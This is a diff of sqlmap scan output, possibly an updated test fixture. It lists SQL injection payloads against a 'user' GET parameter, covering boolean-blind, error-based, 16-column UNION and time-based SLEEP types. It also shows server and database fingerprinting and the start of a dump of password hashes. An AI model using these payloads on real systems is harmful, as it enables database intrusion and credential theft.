@@ -1,22 +1,26 @@
-sqlmap identified the following injection points with a total of 54 HTTP(s) requests:
+sqlmap identified the following injection points with a total of 33 HTTP(s) requests:
 ---
 Place: GET
 Parameter: user
     Type: boolean-based blind
     Title: AND boolean-based blind - WHERE or HAVING clause
-    Payload: user=root' AND 8790=8790 AND 'RkIc'='RkIc
+    Payload: user=root' AND 5970=5970 AND 'PCFO'='PCFO
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause
+    Payload: user=root' AND (SELECT 2005 FROM(SELECT COUNT(*),CONCAT(0x716a626571,(SELECT (CASE WHEN (2005=2005) THEN 1 ELSE 0 END)),0x716e6c7571,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'etAv'='etAv
 
     Type: UNION query
     Title: MySQL UNION query (NULL) - 16 columns
-    Payload: user=root' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x716f756571,0x5249797449656c4c6d63,0x71726e7871),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+    Payload: user=root' UNION ALL SELECT NULL,CONCAT(0x716a626571,0x4871426a52417a617556,0x716e6c7571),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
 
     Type: AND/OR time-based blind
     Title: MySQL > 5.0.11 AND time-based blind
-    Payload: user=root' AND SLEEP(5) AND 'hgFl'='hgFl
+    Payload: user=root' AND SLEEP(5) AND 'Kkru'='Kkru
 ---
 web server operating system: Linux Ubuntu 12.04 (Precise Pangolin)
 web application technology: Apache 2.2.22, PHP 5.3.10
-back-end DBMS: MySQL 5.0.11
+back-end DBMS: MySQL 5.0
 database management system users password hashes:
 [*] % [1]:
     password hash: NULL
